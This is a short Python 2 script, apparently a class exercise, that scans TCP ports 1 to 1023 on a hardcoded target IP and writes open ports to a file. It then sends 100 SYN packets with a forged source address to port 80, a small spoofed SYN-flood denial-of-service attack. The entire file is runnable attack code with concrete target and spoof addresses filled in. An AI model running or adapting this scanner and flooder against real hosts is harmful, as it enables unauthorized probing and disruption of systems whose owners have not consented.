#! /usr/bin/env python2
import socket
from scapy.all import *

class TcpAttack:
    def __init__(self,spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
    def scanTarget(self,rangeStart, rangeEnd):
        fptr = open('openports.txt','w')
	##try connect to every port between rangeStart and rangeEnd
        for testport in range(rangeStart,rangeEnd):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
		##If no error arised, write to file
                sock.connect((self.targetIP, testport))
                fptr.write("{}\n".format(testport))
            except:
                pass
        fptr.close()

    def attackTarget(self,port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            sock.connect((self.targetIP,port))
        except:
            return False
	##Send 100 SYN to targetIP from spoofIP through Port
	for i in range(100):
            send(IP(src = self.spoofIP, dst = self.targetIP)/TCP(sport = RandShort(),dport = port,flags = "S"))
	return True


if __name__ == "__main__":
    spoofIP = '10.186.32.3'
    targetIP = '128.46.75.61'
    rangeStart = 1					
    rangeEnd = 1024
    port = 80
    tcp = TcpAttack(spoofIP,targetIP)
    tcp.scanTarget(rangeStart,rangeEnd)
    if(tcp.attackTarget(port)):
        print 'port was open to attack'
